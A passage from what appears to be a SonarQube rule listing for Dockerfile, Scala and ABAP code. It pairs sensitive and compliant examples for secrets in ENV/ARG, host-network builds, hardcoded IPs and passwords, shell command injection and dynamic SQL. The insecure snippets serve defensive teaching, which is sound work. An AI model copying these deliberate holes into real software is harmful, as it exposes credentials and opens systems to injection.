runtime.</p>
<p>In most cases, build-time and environment variables are used to propagate configuration items from the host to the image or container. A typical
example for an environmental variable is the <code>PATH</code> variable, used to configure where system executables are searched for.</p>
<p>Using <code>ARG</code> and <code>ENV</code> to propagate configuration entries that contain secrets causes a security risk. Indeed, in most cases,
artifacts of those values are kept in the final image. The secret information leak can happen either in the container environment itself, the image
metadata or the build environment logs.</p>
<p>The concrete impact of such an issue highly depends on the secret’s purpose and the exposure sphere:</p>
<ul><li> Financial impact if a paid service API key is disclosed and used. </li><li> Application compromise if an application’s secret, like a session signing key, is disclosed. </li><li> Infrastructure component takeover, if a system secret, like a remote access key, is leaked. </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> The variable contains a value that should be kept confidential. </li><li> The container image or Dockerfile will be distributed to users who do not need to know the secret value. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use Buildkit’s secret mount options when secrets have to be used at build time. </li><li> For run time secret variables, best practices would recommend only setting them at runtime, for example with the <code>--env</code> option of
  the <code>docker run</code> command. </li></ul>
<p>Note that, in both cases, the files exposing the secrets should be securely stored and not exposed to a large sphere. In most cases, using a secret
vault or another similar component should be preferred. For example, <strong>Docker Swarm</strong> provides a <strong>secrets</strong> service that
can be used to handle most confidential data.</p>
<h2>Sensitive Code Example</h2>
<pre>
FROM example
# Sensitive
ARG ACCESS_TOKEN
# Sensitive
ENV ACCESS_TOKEN&#61;${ACCESS_TOKEN}
CMD /run.sh
</pre>
<h2>Compliant Solution</h2>
<p>For build time secrets, use <a href="https://docs.docker.com/engine/reference/builder/#run---mounttypesecret" rel="nofollow">Buildkit’s secret mount type</a>
instead:</p>
<pre>
FROM example
RUN --mount&#61;type&#61;secret,id&#61;build_secret ./installer.sh
</pre>
<p>For runtime secrets, leave the environment variables empty until runtime:</p>
<pre>
FROM example
ENV ACCESS_TOKEN&#61;&#34;&#34;
CMD /run.sh
</pre>
<p>Store the runtime secrets in an <a href="https://docs.docker.com/compose/env-file/" rel="nofollow">environment file</a> (such as <code>.env</code>) and then start
the container with the <a href="https://docs.docker.com/engine/reference/commandline/run/#set-environment-variables—​e---env---env-file" rel="nofollow"><code>--env-file</code></a>
argument:</p>
<pre>
docker run --env-file .env myImage
</pre>
<h2>See</h2>
<ul><li> <a href="https://docs.docker.com/engine/reference/builder/#env" rel="nofollow">Dockerfile reference</a> - ENV command </li><li> <a href="https://docs.docker.com/engine/reference/builder/#arg" rel="nofollow">Dockerfile reference</a> - ARG command </li><li> <a href="https://docs.docker.com/engine/reference/builder/#run---mounttypesecret" rel="nofollow">Dockerfile reference</a> - RUN command secrets mount points
  </li><li> <a href="https://docs.docker.com/engine/swarm/secrets/" rel="nofollow">Docker documentation</a> - Manage sensitive data with Docker secrets </li><li> <a href="https://cwe.mitre.org/data/definitions/522.html" rel="nofollow">MITRE, CWE-522</a> - Insufficiently Protected Credentials </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S6497">
              docker:S6497
            </a>
          </td>
          <td>
            <details>
              <p>A container image digest uniquely and immutably identifies a container image. A tag, on the other hand, is a mutable reference to a container
image.</p>
<p>This tag can be updated to point to another version of the container at any point in time.<br /> In general, the use of image digests instead of tags
is intended to keep determinism stable within a system or infrastructure for reliability reasons.</p>
<p>The problem is that pulling such an image prevents the resulting container from being updated or patched in order to remove vulnerabilities or
significant bugs.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> You expect to receive security updates of the base image. </li></ul>
<p>There is a risk if you answer yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Containers should get the latest security updates. If there is a need for determinism, the solution is to find tags that are not as prone to change
as <code>latest</code> or <a href="https://github.com/docker-library/faq#whats-the-difference-between-shared-and-simple-tags" rel="nofollow">shared tags</a>.</p>
<p>To do so, favor a more precise tag that uses <a href="https://semver.org/" rel="nofollow">semantic versioning</a> and target a major version, for example.</p>
<h2>Sensitive Code Example</h2>
<pre>
FROM mongo&#64;sha256:8eb8f46e22f5ccf1feb7f0831d02032b187781b178cb971cd1222556a6cee9d1

RUN echo ls
</pre>
<h2>Compliant Solution</h2>
<p>Here, mongo:6.0 is better than using a digest, and better than using a more precise version, such as 6.0.4, because it would prevent 6.0.5 security
updates:</p>
<pre>
FROM mongo:6.0

RUN echo ls
</pre>
<h2>See</h2>
<ul><li> <a href="https://github.com/safe-waters/docker-lock" rel="nofollow">Docker-Lock</a> </li><li> <a href="https://cloud.google.com/kubernetes-engine/docs/archive/using-container-image-digests-in-kubernetes-manifests#recommendations" rel="nofollow">Skaffold, kpt,
  digester, kustomize, gke-deploy, ko, and Bazel</a> </li><li> <a href="https://cloud.google.com/kubernetes-engine/docs/archive/using-container-images" rel="nofollow">GKE, Using Container Image Digests</a> </li><li> <a href="https://docs.openshift.com/container-platform/3.11/architecture/core_concepts/builds_and_image_streams.html#image-streams" rel="nofollow">OpenShift,
  Builds and Image Streams</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S6431">
              docker:S6431
            </a>
          </td>
          <td>
            <details>
              <p>Using host operating system namespaces can lead to compromise of the host system.<br /> Opening network services of the local host system to the
container creates a new attack surface for attackers.</p>
<p>Host network sharing could provide a significant performance advantage for workloads that require critical network performance. However, the
successful exploitation of this attack vector could have a catastrophic impact on confidentiality within the host.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The host exposes sensitive network services. </li><li> The container’s services performances do <strong>not</strong> rely on operating system namespaces. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not use host operating system namespaces.</p>
<h2>Sensitive Code Example</h2>
<pre>
# syntax&#61;docker/dockerfile:1.3
FROM example
# Sensitive
RUN --network&#61;host wget -O /home/sessions http://127.0.0.1:9000/sessions
</pre>
<h2>Compliant Solution</h2>
<pre>
# syntax&#61;docker/dockerfile:1.3
FROM example
RUN --network&#61;none wget -O /home/sessions http://127.0.0.1:9000/sessions
</pre>
<h2>See</h2>
<ul><li> <a href="https://docs.docker.com/build/buildkit/dockerfile-frontend/" rel="nofollow">Dockerfile reference</a> - Custom Dockerfile syntax </li><li> <a href="https://docs.docker.com/engine/reference/builder/#run---network" rel="nofollow">Dockerfile reference</a> - RUN --network </li><li> <a href="https://cwe.mitre.org/data/definitions/653.html" rel="nofollow">MITRE, CWE-653</a> - Improper Isolation or Compartmentalization </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S6470">
              docker:S6470
            </a>
          </td>
          <td>
            <details>
              <p>When building a Docker image from a Dockerfile, a context directory is used and sent to the Docker daemon before the actual build starts. This
context directory usually contains the Dockerfile itself, along with all the files that will be necessary for the build to succeed. This generally
includes:</p>
<ul><li> the source code of applications to set up in the container. </li><li> configuration files for other software components. </li><li> other necessary packages or components. </li></ul>
<p>The <code>COPY</code> and <code>ADD</code> directives in the Dockerfiles are then used to actually copy content from the context directory to the
image file system.</p>
<p>When <code>COPY</code> or <code>ADD</code> are used to recursively copy entire top-level directories or multiple items whose names are determined
at build-time, unexpected files might get copied to the image filesystem. It could affect their confidentiality.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The copied files and directories might contain sensitive data that should be kept confidential. </li><li> The context directory contains files and directories that have no functional purpose for the final container image. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<p>Keep in mind that the content of the context directory might change depending on the build environment and over time.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Limit the usage of globbing in the <code>COPY</code> and <code>ADD</code> sources definition. </li><li> Avoid copying the entire context directory to the image filesystem. </li><li> Prefer providing an explicit list of files and directories that are required for the image to properly run. </li></ul>
<h2>Sensitive Code Example</h2>
<p>Copying the complete context directory:</p>
<pre>
FROM ubuntu:22.04
# Sensitive
COPY . .
CMD /run.sh
</pre>
<p>Copying multiple files and directories whose names are expanded at build time:</p>
<pre>
FROM ubuntu:22.04
# Sensitive
COPY ./example* /
COPY ./run.sh /
CMD /run.sh
</pre>
<h2>Compliant Solution</h2>
<pre>
FROM ubuntu:22.04
COPY ./example1 /example1
COPY ./example2 /example2
COPY ./run.sh /
CMD /run.sh
</pre>
<h2>See</h2>
<ul><li> <a href="https://docs.docker.com/engine/reference/builder/#copy" rel="nofollow">Dockerfile reference</a> - COPY directive </li><li> <a href="https://docs.docker.com/engine/reference/builder/#add" rel="nofollow">Dockerfile reference</a> - ADD directive </li><li> <a href="https://cwe.mitre.org/data/definitions/668.html" rel="nofollow">MITRE, CWE-668</a> - Exposure of Resource to Wrong Sphere </li><li> <a href="https://cwe.mitre.org/data/definitions/497.html" rel="nofollow">MITRE, CWE-497</a> - Exposure of Sensitive System Information to an Unauthorized
  Control Sphere </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=scala:S1313">
              scala:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-5901" rel="nofollow">CVE-2006-5901</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2005-3725" rel="nofollow">CVE-2005-3725</a> </li></ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul><li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li><li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li></ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul><li> Can give information to an attacker about the network topology. </li><li> It’s a personal (assigned to an identifiable person) IP address. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
val ip &#61; &#34;192.168.12.42&#34; // Sensitive
val socket &#61; new Socket(ip, 6667)
</pre>
<h2>Compliant Solution</h2>
<pre>
val ips &#61; Source.fromFile(configuration_file).getLines.toList // Compliant
val socket &#61; new Socket(ips(0), 6667)
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul><li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li><li> Broadcast address 255.255.255.255 </li><li> Non-routable address 0.0.0.0 </li><li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm" rel="nofollow">often match
  Object Identifiers</a> (OID) </li><li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc5737" rel="nofollow">RFC 5737</a> </li><li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849" rel="nofollow">RFC
  3849</a> </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=scala:S2068">
              scala:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2019-13466" rel="nofollow">CVE-2019-13466</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-15389" rel="nofollow">CVE-2018-15389</a> </li></ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It’s recommended to customize the configuration of this rule with additional credential words such as &#34;oauthToken&#34;, &#34;secret&#34;, …​</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li><li> Credentials are used in production environments. </li><li> Application re-distribution is required before updating the credentials. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Store the credentials in a configuration file that is not pushed to the code repository. </li><li> Store the credentials in a database. </li><li> Use your cloud provider’s service for managing secrets. </li><li> If a password has been disclosed through the source code: change it. </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li><li> <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li><li> <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">MITRE, CWE-259</a> - Use of Hard-coded Password </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD" rel="nofollow">Hard Coded Password</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=abap:S4721">
              abap:S4721
            </a>
          </td>
          <td>
            <details>
              <p>Arbitrary OS command injection vulnerabilities are more likely when a shell is spawned rather than a new process, indeed shell meta-chars can be
used (when parameters are user-controlled for instance) to inject OS commands.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> OS command name or parameters are user-controlled. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Use functions that don’t spawn a shell.</p>
<h2>Sensitive Code Example</h2>
<pre>
CALL &#39;SYSTEM&#39; ID &#39;COMMAND&#39; FIELD usr_input ID &#39;TAB&#39; FIELD TAB1.  &#34; Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
CALL &#39;SYSTEM&#39; ID &#39;COMMAND&#39; FIELD &#34;/usr/bin/file.exe&#34; ID &#39;TAB&#39; FIELD TAB1.  &#34; Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/78" rel="nofollow">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=abap:S2068">
              abap:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2019-13466" rel="nofollow">CVE-2019-13466</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-15389" rel="nofollow">CVE-2018-15389</a> </li></ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It’s recommended to customize the configuration of this rule with additional credential words such as &#34;oauthToken&#34;, &#34;secret&#34;, …​</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li><li> Credentials are used in production environments. </li><li> Application re-distribution is required before updating the credentials. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Store the credentials in a configuration file that is not pushed to the code repository. </li><li> Store the credentials in a database. </li><li> Use your cloud provider’s service for managing secrets. </li><li> If a password has been disclosed through the source code: change it. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
DATA: password(10) VALUE &#39;secret123&#39;,
           pwd(10) VALUE &#39;secret123&#39;.
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li><li> <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li><li> <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">MITRE, CWE-259</a> - Use of Hard-coded Password </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD" rel="nofollow">Hard Coded Password</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=abap:S1493">
              abap:S1493
            </a>
          </td>
          <td>
            <details>
              <p>There are two main reasons to ban dynamic clauses in <code>SELECT</code> statements.</p>
<p>The first relates to maintainability. One of the nice features of ABAP Design Time is the connection to the data dictionary; you get syntax errors
if you try to address table fields that are not present anymore or that have typos. With dynamic SQL, the ability to statically check the code for
this type of error is lost.</p>
<p>The other more critical reason relates to security. By definition, dynamic clauses make an application susceptible to SQL injection attacks.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The SQL statement can be written without dynamic clauses. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not use dynamic clauses in &#34;SELECT&#34; statements.</p>
<h2>Sensitive Code Example</h2>
<pre>
SELECT (select_clause)
 FROM (from_clause) CLIENT SPECIFIED INTO &lt;fs&gt;
 WHERE (where_clause)
 GROUP BY (groupby_clause) HAVING (having_clause)
 ORDER BY (orderby_clause).
</pre>
<h2>Compliant Solution</h2>
<pre>
SELECT *
 FROM db_persons INTO us_persons
 WHERE country IS &#39;US&#39;.
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/89" rel="nofollow">MITRE, CWE-89</a> - SQL Injection </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=abap:S1492">
              abap:S1492
            </a>
          </td>
          <td>
            <details>
              <p>Although the <code>WHERE</code> condition is optional in a <code>SELECT</code> statement, for performance and security reasons, a
<code>WHERE</code> clause should always be specified to prevent reading the whole table.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The whole table is not required. </li><li> The table contains sensitive information. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Add a &#34;WHERE&#34; condition to &#34;SELECT&#34; statements.</p>
<h2>Sensitive Code Example</h2>
<pre>
SELECT * FROM db_persons INTO us_persons.
</pre>
<h2>Compliant Solution</h2>
<pre>
SELECT * FROM db_persons INTO us_persons WHERE country IS &#39;US&#39;.
</pre>
<h2>Exceptions</h2>
<p><code>SELECT SINGLE</code> and <code>UP TO 1 ROWS</code> result in only one record being read, so such <code>SELECT</code>s are ignored by this
rule.</p>
<pre>
SELECT SINGLE * FROM db_persons INTO us_persons.

SELECT * FROM db_persons UP TO 1 ROWS INTO us_persons.
</pre>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=abap:S1313">
              abap:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-5901" rel="nofollow">CVE-2006-5901</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2005-3725" rel="nofollow">CVE-2005-3725</a> </li></ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul><li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li><li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li></ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul><li> Can give information to an attacker about the network topology. </li><li> It’s a personal (assigned to an identifiable person) IP address. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
DATA: ip TYPE string VALUE &#39;192.168.12.42&#39;.
</pre>
<h2>Compliant Solution</h2>
<pre>
READ DATASET file INTO ip MAXIMUM LENGTH len.
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul><li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li><li> Broadcast address 255.255.255.255 </li><li> Non-routable address 0.0.0.0 </li><li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm" rel="nofollow">often match
  Object Identifiers</a> (OID) </li><li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc5737" rel="nofollow">RFC 5737</a> </li><li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849" rel="nofollow">RFC
  3849</a> </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=abap:S5117">
              abap:S5117
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Every <code>AUTHORITY-CHECK</code> statement sets the fields <code>SY-SUBRC</code> (also accessible as <code>SYST-SUBRC</code>) to the
authorization check result. Thus <code>SY-SUBRC</code> value should be checked just after every <code>AUTHORITY-CHECK</code> statement.</p>
<h3>Noncompliant code example</h3>
<pre>
AUTHORITY-CHECK OBJECT &#39;S_MYOBJ&#39; &#34;Noncompliant
    ID &#39;ID1&#39; FIELD myvalue.
</pre>
<h3>Compliant solution</h3>
<pre>
AUTHORITY-CHECK OBJECT &#39;S_MYOBJ&#39;  &#34;Compliant
    ID &#39;ID1&#39; FIELD myvalue.

  IF sy-subrc &lt;&gt; 0.
    MESSAGE &#39;NOT AUTHORIZED&#39; TYPE &#39;E&#39;.
  ENDIF.
</pre>
<h3>Exceptions</h3>
<p>No issue will be raised in the following cases:</p>
<ul><li> One or more <code>WRITE</code> operation are performed between the <code>AUTHORITY-CHECK</code> statement and <code>SY-SUBRC</code> check. An
  exception will be however raised if the <code>WRITE</code> operation is a <code>WRITE ... TO</code> statement, as this will set again
  <code>SY-SUBRC</code>. </li><li> <code>SY-SUBRC</code>&#39;s value is assigned to a variable. We then assume that it will be checked later. </li></ul>
<pre>
AUTHORITY-CHECK OBJECT &#39;S_MYOBJ&#39;  &#34;Compliant
    ID &#39;ID1&#39; FIELD myvalue.
WRITE &#39;Test&#39; &#34; WRITE is accepted before checking SY-SUBRC
IF SY-SUBRC &lt;&gt; 0.
    EXIT.
ENDIF.

AUTHORITY-CHECK OBJECT &#39;S_MYOBJ&#39;  &#34;Compliant
    ID &#39;ID1&#39; FIELD myvalue.
Tmp &#61; SY-SUBRC &#34; Assigning SY-SUBRC value to a variable. We assume that it will be checked later.
IF Tmp &lt;&gt; 0.
    EXIT.
ENDIF.
</pre>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=abap:S1674">
              abap:S1674
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Leaving a <code>CATCH</code> block empty means that the exception in question is neither handled nor passed forward to callers for handling at a
higher level. Suppressing errors rather than handling them could lead to unpredictable system behavior and should be avoided.</p>
<h3>Noncompliant code example</h3>
<pre>
  try.
    if ABS( NUMBER ) &gt; 100.
      write / &#39;Number is large&#39;.
    endif.
    catch CX_SY_ARITHMETIC_ERROR into OREF.
  endtry.
</pre>
<h3>Compliant solution</h3>
<pre>
  try.
    if ABS( NUMBER ) &gt; 100.
      write / &#39;Number is large&#39;.
    endif.
  catch CX_SY_ARITHMETIC_ERROR into OREF.
    write / OREF-&gt;GET_TEXT( ).
  endtry.
</pre>
<h3>Exceptions</h3>
<p>When a block contains a comment, it is not considered to be empty.</p>
<h2>Resources</h2>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/391" rel="nofollow">MITRE, CWE-391</a> - Unchecked Error Condition </li><li> OWASP Top 10 2017 Category A10 - Insufficient Logging &amp; Monitoring </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=abap:S5115">
              abap:S5115
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Checking logged users&#39; permissions by comparing their name to a hardcoded string can create security vulnerabilities. It prevents system
administrators from changing users&#39; permissions when needed (example: when their account has been compromised). Thus system fields
<code>SY-UNAME</code> and <code>SYST-UNAME</code> should not be compared to hardcoded strings. Use instead <code>AUTHORITY-CHECK</code> to check
users&#39; permissions.</p>
<p>This rule raises an issue when either of the system fields <code>SY-UNAME</code> or <code>SYST-UNAME</code> are compared to a hardcoded value in a
<code>CASE</code> statement or using one of the following operators: <code>&#61;</code>, <code>EQ</code>, <code>&lt;&gt;</code>, <code>NE</code>.</p>
<h3>Noncompliant code example</h3>
<pre>
IF SY-UNAME &#61; &#39;ALICE&#39;. &#34; Noncompliant
ENDIF.

CASE SY-UNAME.
WHEN &#39;A&#39;. &#34; Noncompliant
ENDCASE.
</pre>
<h3>Compliant solution</h3>
<pre>
AUTHORITY-CHECK OBJECT &#39;S_CARRID&#39;
  ID &#39;CARRID&#39; FIELD mycarrid.
IF sy-subrc &lt;&gt; 0.
  MESSAGE &#39;Not authorized&#39; TYPE &#39;E&#39;.
ENDIF.
</pre>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=abap:S1486">
              abap:S1486
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>A <code>BREAK-POINT</code> statement is used when debugging an application with help of the ABAP Debugger. But such debugging statements could make
an application vulnerable to attackers, and should not be left in the source code.</p>
<h3>Noncompliant code example</h3>
<pre>
IF wv_parallel EQ &#39;X&#39;.
  BREAK-POINT.
  WAIT UNTIL g_nb_return EQ wv_nb_call.
ENDIF.
</pre>
<h3>Compliant solution</h3>
<pre>
IF wv_parallel EQ &#39;X&#39;.
